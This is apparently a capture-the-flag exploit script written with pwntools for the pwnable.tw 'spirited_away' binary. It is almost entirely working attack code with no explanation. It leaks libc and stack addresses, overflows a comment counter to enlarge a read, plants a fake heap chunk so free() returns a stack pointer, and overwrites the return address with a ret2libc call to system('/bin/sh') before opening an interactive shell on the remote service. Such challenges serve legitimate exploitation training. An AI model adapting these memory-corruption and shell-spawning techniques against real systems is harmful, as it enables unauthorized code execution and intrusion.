from pwn import *
import sys
import time
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./spirited_away")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./spirited_away")
else:
	p = remote("chall.pwnable.tw",10204)
	libc = ELF("./libc_32.so.6")
	elf = ELF("./spirited_away")

def add_comment(name,age,reason,comment,conti = True):
	p.sendafter("Please enter your name: ",name)
	p.sendafter("Please enter your age: ",str(age) + "\x0a")
	p.sendafter("Why did you came to see this movie? ",reason)
	p.sendafter("Please enter your comment: ",comment)
	info = p.recvuntil("We will review them as soon as we can\n\n")
	if conti :
		p.sendafter("Would you like to leave another comment? <y/n>: ","Y")
	else:
		p.sendafter("Would you like to leave another comment? <y/n>: ","n")
	return info

def add_comment2(name,age,reason,comment,conti = True):
	p.recvuntil("\nPlease enter your name: ")
	p.sendafter("Please enter your age: ",str(age) + "\x0a")
	p.sendafter("Why did you came to see this movie? ",reason)
	info = p.recvuntil("We will review them as soon as we can\n\n")
	if conti :
		p.sendafter("Would you like to leave another comment? <y/n>: ","Y")
	else:
		p.sendafter("Would you like to leave another comment? <y/n>: ","n")
	return info

def leak(index,count):
	for i in range(index,index+4):
		info = add_comment("a",1,"b"*i,"c")
		count += 1
		if "b"*i + "\n" not in info:
			info = info[info.find("b"*index)+index:info.find("b"*index)+index+4]
			break
	info = info.replace("b","\x00")
	return u32(info),count

def debug():
	gdb.attach(p,"b *0x080488C9\nb *0x08048643")
	

context.log_level = "debug"
#debug()
#leak libc
offset = 0xf7f3e000 - 0xf7d8c000
info,count = leak(0x18,0)
libc.address = info - 7 - libc.symbols["_IO_file_sync"]
log.success("libc_base:"+hex(libc.address))
#leak stack
info,count = leak(0x50,count)
ebp_addr = info - 0x20
log.success("ebp_addr:"+hex(ebp_addr))

while count < 10 :
	add_comment("a",1,"b","c") 
	count += 1
for i in range(90):
	add_comment2("a"*0x0a,1,"b"*0x50,"c"*0x3c)
#gdb.attach(p,"b *0x080488C9")
payload = "a"*(0xA8-0x58) + "aaaa" + p32(ebp_addr-0x50+0x8)
payload2 = p32(0) + p32(0x41) + "a"*0x38 + p32(0) + p32(0x1234)
add_comment("a",1,payload2,payload)
system_addr = libc.symbols["system"]
binsh_addr = libc.search("/bin/sh").next()
payload3 = "a"*72 + "junk" + p32(system_addr) + "junk" + p32(binsh_addr)
add_comment(payload3,1,"a","a",False)
p.interactive()
